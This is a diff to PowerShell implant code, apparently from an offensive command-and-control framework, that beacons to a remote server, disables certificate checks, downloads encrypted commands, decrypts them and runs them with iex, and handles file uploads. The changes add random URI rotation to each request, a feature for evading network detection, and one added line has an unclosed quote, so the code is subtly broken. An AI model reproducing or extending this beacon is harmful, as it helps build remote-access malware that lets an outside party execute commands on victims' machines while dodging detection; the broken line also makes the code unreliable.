@@ -1025,6 +1025,7 @@ $payloadclear = @"
 `$Server = "$Server"
 `$Serverclean = "$Serverclean"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
+`$S="$s"
 function Get-Webclient {${function:Get-Webclient}} function Primer {${function:primer}}
 `$primer = primer
 if (`$primer) {`$primer| iex} else {
@@ -1160,6 +1161,8 @@ while($true)
     try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
 
      while($ReadCommand) {
+        $RandomURI = Get-Random $URLS
+        $Server = "$ServerClean/$RandomURI$URI
         $ReadCommandClear = Decrypt-String $key $ReadCommand
         $error.clear()
         if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
@@ -1167,6 +1170,8 @@ while($true)
                     $splitcmd = $ReadCommandClear -replace "multicmd",""
                     $split = $splitcmd -split "!d-3dion@LD!-d"
                     foreach ($i in $split){
+                        $RandomURI = Get-Random $URLS
+                        $Server = "$ServerClean/$RandomURI$URI"
                         $error.clear()
                         if  ($i.ToLower().StartsWith("upload-file")) {
                             try {
@@ -1363,6 +1368,7 @@ $sleeptime = '+$defaultbeacon+'
 
 $payloadclear = @"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
+`$S="$s"
 function Get-Webclient {${function:Get-Webclient}} function Primer {${function:primer}}
 `$primer = primer
 if (`$primer) {`$primer| iex} else {
@@ -1499,6 +1505,8 @@ while($true)
     try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
     
     while($ReadCommand) {
+        $RandomURI = Get-Random $URLS
+        $Server = "$ServerClean/$RandomURI$URI"
         $ReadCommandClear = Decrypt-String $key $ReadCommand
         $error.clear()
         if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
@@ -1506,6 +1514,8 @@ while($true)
                     $splitcmd = $ReadCommandClear -replace "multicmd",""
                     $split = $splitcmd -split "!d-3dion@LD!-d"
                     foreach ($i in $split){
+                        $RandomURI = Get-Random $URLS
+                        $Server = "$ServerClean/$RandomURI$URI"
                         $error.clear()
                         if  ($i.ToLower().StartsWith("upload-file")) {
                             try {
